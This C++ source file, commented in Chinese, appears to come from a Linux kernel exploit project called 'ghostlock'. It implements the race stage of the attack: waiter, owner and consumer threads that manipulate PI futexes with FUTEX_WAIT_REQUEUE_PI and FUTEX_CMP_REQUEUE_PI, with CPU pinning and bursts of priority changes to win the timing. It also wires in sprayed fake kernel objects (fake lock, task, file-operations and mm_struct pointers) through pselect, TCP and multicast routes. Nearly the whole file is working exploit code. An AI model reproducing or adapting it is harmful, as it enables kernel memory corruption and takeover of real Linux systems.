/**
 * @file race.cpp
 * @brief PI 竞态（含 cmp_disasm 6 个目标函数）（自 core.cpp 按用途拆分，逐字保留）。
 */
#include "race.h"
#include "session.h"
#include "route.h"
#include "profile.h"
#include "support.h"
#include "log.h"
#include "memory.h"
#include "params.h"
#include "route_select.h"

/* ==== race/pi_race.cpp（PiRace 存储/方法，非 6 目标） ==== */
using namespace ghostlock;

bool ghostlock::race::PiRace::reset(
    uint32_t initial_delay_usec, int32_t main_cpu_value, int32_t consumer_cpu_value) noexcept {
    if (waiter_owner.joinable() || owner_owner.joinable() ||
        consumer_owner.joinable()) {
        return false;
    }
    waiter_owner = support::PthreadOwner{};
    owner_owner = support::PthreadOwner{};
    consumer_owner = support::PthreadOwner{};
    wait_futex = 0;
    target_futex = 0;
    chain_futex = 0;
    waiter_ready.store(0, std::memory_order_relaxed);
    waiter_waiting.store(0, std::memory_order_relaxed);
    owner_started.store(0, std::memory_order_relaxed);
    owner_chain_done.store(0, std::memory_order_relaxed);
    owner_stop.store(0, std::memory_order_relaxed);
    route_done.store(0, std::memory_order_relaxed);
    waiter_tid.store(0, std::memory_order_relaxed);
    consumer_go.store(0, std::memory_order_relaxed);
    consumer_stop.store(0, std::memory_order_relaxed);
    consumer_calls.store(0, std::memory_order_relaxed);
    consumer_success.store(0, std::memory_order_relaxed);
    consumer_inflight.store(0, std::memory_order_relaxed);
    route_delay_usec.store(initial_delay_usec,
                           std::memory_order_relaxed);
    fast_repair.store(0, std::memory_order_relaxed);
    main_cpu = main_cpu_value;
    consumer_cpu = consumer_cpu_value;
    request = nullptr;
    route_status = route::RouteStatus{.code = route::ROUTE_RETRYABLE};
    return true;
}

int32_t ghostlock::race::PiRace::start_threads(
    void *(*waiter_entry)(void *), void *(*owner_entry)(void *),
    void *(*consumer_entry)(void *), const memory::WriteRequest * route_request)
noexcept
 {
    if (!waiter_entry || !owner_entry || !consumer_entry) return EINVAL;
    request = route_request;
    int32_t error = consumer_owner.start(consumer_entry, this);
    if (error) {
        request = nullptr;
        return error;
    }
    error = owner_owner.start(owner_entry, this);
    if (error) {
        const int32_t cleanup_error = abort_startup();
        if (cleanup_error != 0) {
            route_status = route::RouteStatus{
                .code = route::ROUTE_DIRTY_FAILURE,
                .step = 19,
                .error_number = cleanup_error,
            };
            return cleanup_error;
        }
        return error;
    }
    error = waiter_owner.start(waiter_entry, this);
    if (error) {
        const int32_t cleanup_error = abort_startup();
        if (cleanup_error != 0) {
            route_status = route::RouteStatus{
                .code = route::ROUTE_DIRTY_FAILURE,
                .step = 19,
                .error_number = cleanup_error,
            };
            return cleanup_error;
        }
        return error;
    }
    return 0;
}

int32_t ghostlock::race::PiRace::abort_startup() noexcept {
    consumer_stop.store(1);
    owner_stop.store(1);
    owner_owner.request_stop();
    consumer_owner.request_stop();
    const int32_t owner_error = owner_owner.joinable() ? owner_owner.join() : 0;
    const int32_t consumer_error = consumer_owner.joinable() ? consumer_owner.join() : 0;
    const int32_t first_error = owner_error != 0 ? owner_error : consumer_error;
    if (first_error == 0) request = nullptr;
    return first_error;
}

void ghostlock::race::PiRace::request_stop() noexcept {
    consumer_go.store(0);
    consumer_stop.store(1);
    owner_stop.store(1);
}

int32_t ghostlock::race::PiRace::join() noexcept {
    int32_t first_error = 0;
    const int32_t waiter_error = waiter_owner.joinable() ? waiter_owner.join() : 0;
    if (waiter_error != 0) first_error = waiter_error;
    const int32_t owner_error = owner_owner.joinable() ? owner_owner.join() : 0;
    if (first_error == 0 && owner_error != 0) {
        first_error = owner_error;
    }
    const int32_t consumer_error = consumer_owner.joinable() ? consumer_owner.join() : 0;
    if (first_error == 0 && consumer_error != 0) {
        first_error = consumer_error;
    }
    if (first_error == 0) request = nullptr;
    return first_error;
}

ghostlock::route::RouteStatus ghostlock::race::PiRace::outcome_with_counters(
    const route::RouteStatus &outcome, int32_t calls, int32_t success) noexcept {
    if (outcome.code == route::ROUTE_OK && (calls == 0 || success == 0)) {
        route::RouteStatus retryable = outcome;
        retryable.code = route::ROUTE_RETRYABLE;
        return retryable;
    }
    return outcome;
}


/* ==== 6 个 cmp_disasm 目标（结构体入参，无全局/类/项目宏读取） ==== */

namespace ghostlock::race {
    namespace {
        [[nodiscard]] route::RouteStatus route_dispatch(
            core::ThreadArgs &args, std::int32_t kind) {
            switch (kind) {
                case 0:
                    return ghostlock::route::do_pselect_fake_lock_route(args.route.select);
                case 1:
                    return ghostlock::route::do_tcp_fake_lock_route(args.route.tcp);
                case 2:
                    return ghostlock::route::do_mcast_fake_lock_route(args.route.multicast);
                default:
                    return route::RouteStatus{.code = route::ROUTE_UNSUPPORTED};
            }
        }
    } // namespace

    void *waiter_thread(void *arg) {
        auto *a = static_cast<core::ThreadArgs *>(arg);
        int32_t tid = static_cast<int32_t>(syscall(SYS_gettid));
        a->race.waiter_tid->store(tid);
        if (support::futex_op(a->chain_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0) != 0)
            pr_error("waiter lock chain errno=%d\n", errno);
        a->race.waiter_ready->store(1);
        while (!a->race.owner_started->load())
            usleep(a->poll_us);
        struct timespec timeout;
        SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
        if (a->race.fast_repair->load()) {
            timeout.tv_nsec += static_cast<long>(a->fast_repair_window_ns);
            if (timeout.tv_nsec >= 1000000000L) {
                timeout.tv_sec++;
                timeout.tv_nsec -= 1000000000L;
            }
        } else {
            uint64_t wait_ns = static_cast<uint64_t>(a->route_wait_ms) * 1000000ULL;
            timeout.tv_sec += static_cast<time_t>(wait_ns / 1000000000ULL);
            timeout.tv_nsec += static_cast<long>(wait_ns % 1000000000ULL);
            if (timeout.tv_nsec >= 1000000000L) {
                timeout.tv_sec++;
                timeout.tv_nsec -= 1000000000L;
            }
        }
        a->race.waiter_waiting->store(1);
        errno = 0;
        const long wait_ret = support::futex_op(a->wait_futex, FUTEX_WAIT_REQUEUE_PI, 0,
                                                &timeout, a->target_futex, 0);
        (void) wait_ret;
        route::RouteStatus status = route_dispatch(*a, a->route.kind);
        int32_t fallback_used = 0;
        if (status.code != route::ROUTE_OK && status.can_fallback() &&
            a->route.fallback_kind >= 0 &&
            a->route.fallback_kind != a->route.kind) {
            const route::RouteStatus next =
                route_dispatch(*a, a->route.fallback_kind);
            if (next.code != route::ROUTE_UNSUPPORTED) {
                status = next;
                fallback_used = 1;
            }
        }
        a->out_status = status;
        a->out_fallback = fallback_used;
        if (fallback_used) {
            pr_warning("TCP route cleanly failed; used Select Stack fallback\n");
        }
        if (a->ghost_disarm) {
            uint32_t dummy_pi = a->ghost_disarm_flag | static_cast<uint32_t>(getpid());
            struct timespec expired = {.tv_sec = 0, .tv_nsec = 0};
            errno = 0;
            long disarm = support::futex_op(&dummy_pi, FUTEX_LOCK_PI, 0, &expired,
                                            nullptr, 0);
            pr_info("mcast ghost disarm ret=%ld errno=%d\n", disarm, errno);
        }
        a->race.route_done->store(1);
        support::futex_op(a->chain_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
        while (!a->race.owner_chain_done->load())
            usleep(a->poll_us);
        return nullptr;
    }

    void *owner_thread(void *arg) {
        auto *a = static_cast<core::ThreadArgs *>(arg);
        long lock_target = support::futex_op(a->target_futex, FUTEX_LOCK_PI, 0,
                                             nullptr, nullptr, 0);
        if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
        while (!a->race.waiter_ready->load() && !a->race.owner_stop->load())
            usleep(a->poll_us);
        if (a->race.owner_stop->load()) {
            if (lock_target == 0)
                support::futex_op(a->target_futex, FUTEX_UNLOCK_PI, 0, nullptr,
                                  nullptr, 0);
            return nullptr;
        }
        a->race.owner_started->store(1);
        support::futex_op(a->chain_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
        a->race.owner_chain_done->store(1);
        while (!a->race.owner_stop->load()) sleep(a->owner_idle_sleep_s);
        if (lock_target == 0)
            support::futex_op(a->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
        return nullptr;
    }

    void *consumer_thread(void *arg) {
        auto *a = static_cast<core::ThreadArgs *>(arg);
        kernel::pin_to_core(static_cast<size_t>(a->consumer_cpu));
        pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
        int32_t seen = 0;
        while (!a->race.consumer_stop->load()) {
            int32_t seq = a->race.consumer_go->load();
            if (seq == 0 || seq == seen) {
                __asm__ volatile ("yield" ::: "memory");
                continue;
            }
            seen = seq;
            int32_t tid = a->race.waiter_tid->load();
            int32_t calls_this_seq = 0;
            while (!a->race.consumer_stop->load() &&
                   a->race.consumer_go->load() == seq) {
                uint32_t delay_usec = a->race.route_delay_usec->load();
                if (delay_usec > 0) usleep(static_cast<useconds_t>(delay_usec));
                for (uint32_t burst = 0; burst < a->consumer_burst; burst++) {
                    if (a->race.consumer_stop->load() ||
                        a->race.consumer_go->load() != seq)
                        break;
                    a->race.consumer_calls->fetch_add(1);
                    a->race.consumer_inflight->store(1);
                    errno = 0;
                    /* compact waiter 走 nice 轮转（base + seq % span）；span 为 0
                     * 表示不轮转，只用 base。 */
                    int32_t consumer_nice = static_cast<int32_t>(a->consumer_nice);
                    if (a->compact_waiter) {
                        const uint32_t step =
                            a->consumer_nice_span
                                ? static_cast<uint32_t>(calls_this_seq) % a->consumer_nice_span
                                : 0U;
                        consumer_nice =
                            static_cast<int32_t>(a->consumer_nice_base + step);
                    }
                    long sched_ret = support::sched_setattr_tid(tid, consumer_nice);
                    if (sched_ret != 0) {
                        struct timespec ft = {
                            .tv_sec = 0,
                            .tv_nsec = static_cast<long>(a->consumer_lock_pi_spin_ns),
                        };
                        long fret = support::futex_op(a->target_futex, FUTEX_LOCK_PI, 0,
                                                      &ft, nullptr, 0);
                        if (fret == 0) {
                            support::futex_op(a->target_futex, FUTEX_UNLOCK_PI, 0,
                                              nullptr, nullptr, 0);
                            sched_ret = 0;
                        }
                    }
                    if (sched_ret == 0) a->race.consumer_success->fetch_add(1);
                    a->race.consumer_inflight->store(0);
                    calls_this_seq++;
                    if (static_cast<uint32_t>(calls_this_seq) >= a->consumer_max) {
                        a->race.consumer_go->store(0);
                        break;
                    }
                }
            }
        }
        return nullptr;
    }

    route::RouteStatus run_main_route_threads(core::RaceRunParams &params) {
        core::ThreadArgs &a = params.args;
        const int32_t fast = a.race.fast_repair->load();

        /* The page addresses only exist after the spray; refresh here so every
         * caller sees the current page, not a pre-spray snapshot. */
        if (params.spray && params.spray->current && params.spray->current->base) {
            const core::PageParams page{
                .base = (params.spray->current->base),
                .last_mm_struct = (params.spray->current->last_mm_struct),
                .fake_lock = (params.spray->current->fake_lock),
                .fake_w0 = (params.spray->current->fake_w0),
                .fake_task = (params.spray->current->fake_task),
                .fake_parent = (params.spray->current->fake_parent),
                .fake_right = (params.spray->current->fake_right),
                .fake_left = (params.spray->current->fake_left),
                .fake_fops = (params.spray->current->fake_fops),
            };
            a.route.select.page = page;
            a.route.tcp.page = page;
            a.route.multicast.fake_task = page.fake_task;
            a.route.multicast.fake_lock = page.fake_lock;
        }

        a.race.waiter_ready->store(0);
        a.race.waiter_waiting->store(0);
        a.race.owner_started->store(0);
        a.race.owner_chain_done->store(0);
        a.race.owner_stop->store(0);
        a.race.route_done->store(0);
        a.race.waiter_tid->store(0);
        a.race.consumer_go->store(0);
        a.race.consumer_stop->store(0);
        a.race.consumer_calls->store(0);
        a.race.consumer_success->store(0);
        a.race.consumer_inflight->store(0);
        a.race.route_delay_usec->store(fast ? a.fast_repair_delay_us
                                            : params.enter_delay_us);
        a.race.fast_repair->store(params.preserve_fast_repair ? fast : 0);
        *a.wait_futex = 0;
        *a.target_futex = 0;
        *a.chain_futex = 0;
        a.out_status = route::RouteStatus{.code = route::ROUTE_RETRYABLE};
        a.out_fallback = 0;

        pr_info("[route] creating waiter/owner/consumer\n");
        pthread_t consumer_tid{};
        pthread_t owner_tid{};
        pthread_t waiter_tid{};
        int32_t error = pthread_create(&consumer_tid, nullptr, consumer_thread, &a);
        if (error == 0) error = pthread_create(&owner_tid, nullptr, owner_thread, &a);
        if (error == 0) error = pthread_create(&waiter_tid, nullptr, waiter_thread, &a);
        if (error != 0) {
            a.race.consumer_stop->store(1);
            a.race.owner_stop->store(1);
            pr_warning("PI race thread creation failed errno=%d\n", error);
            if (pthread_join(waiter_tid, nullptr) != 0 ||
                pthread_join(owner_tid, nullptr) != 0 ||
                pthread_join(consumer_tid, nullptr) != 0) {
                support::fail_stop_dirty_race("partial PI worker startup cleanup",
                                              error);
            }
            return route::RouteStatus{
                .code = route::ROUTE_DIRTY_FAILURE,
                .step = 20,
                .error_number = error,
            };
        }

        while (!a.race.waiter_waiting->load() || !a.race.owner_started->load())
            usleep(a.poll_us);
        pr_info("[route] waiter parked; owner started\n");
        usleep(a.race.fast_repair->load() ? a.fast_repair_delay_us
                                          : params.setup_settle_us);
        errno = 0;
        long rq = support::futex_op(a.wait_futex, FUTEX_CMP_REQUEUE_PI, 1,
                                    reinterpret_cast<void *>(1), a.target_futex, 0);
        pr_info("[route] CMP_REQUEUE_PI ret=%ld errno=%d; waiting route_done\n",
                rq, errno);

        struct timespec wait_started{};
        SYSCHK(clock_gettime(CLOCK_MONOTONIC, &wait_started));
        route::RouteStatus status{.code = route::ROUTE_RETRYABLE};
        const double timeout_ms = static_cast<double>(params.route_done_timeout_ms);
        while (!a.race.route_done->load()) {
            if (runtime_time::runtime_elapsed_ms(&wait_started) >= timeout_ms) {
                /* A live PI worker must not be unwound: legacy fail-stops. */
                support::fail_stop_dirty_race("route_done deadline", ETIMEDOUT);
            }
            usleep(a.poll_us);
        }
        status = a.out_status;
        const int32_t calls = a.race.consumer_calls->load();
        const int32_t success = a.race.consumer_success->load();
        if (status.code == route::ROUTE_OK && (calls == 0 || success == 0)) {
            status.code = route::ROUTE_RETRYABLE;
        }
        pr_info("[route] route_done status=%d clean=%d/%d step=%d errno=%d "
                "calls=%d success=%d\n", status.code, status.userspace_clean,
                status.kernel_disarmed, status.step, status.error_number,
                calls, success);
        if (status.code == route::ROUTE_DIRTY_FAILURE) {
            support::fail_stop_dirty_race("route dirty", status.error_number);
        }

        a.race.consumer_go->store(0);
        a.race.consumer_stop->store(1);
        a.race.owner_stop->store(1);
        if (pthread_join(waiter_tid, nullptr) != 0 ||
            pthread_join(owner_tid, nullptr) != 0 ||
            pthread_join(consumer_tid, nullptr) != 0) {
            support::fail_stop_dirty_race("PI worker join", errno);
        }
        pr_info("[route] threads joined\n");
        return status;
    }

} // namespace ghostlock::race
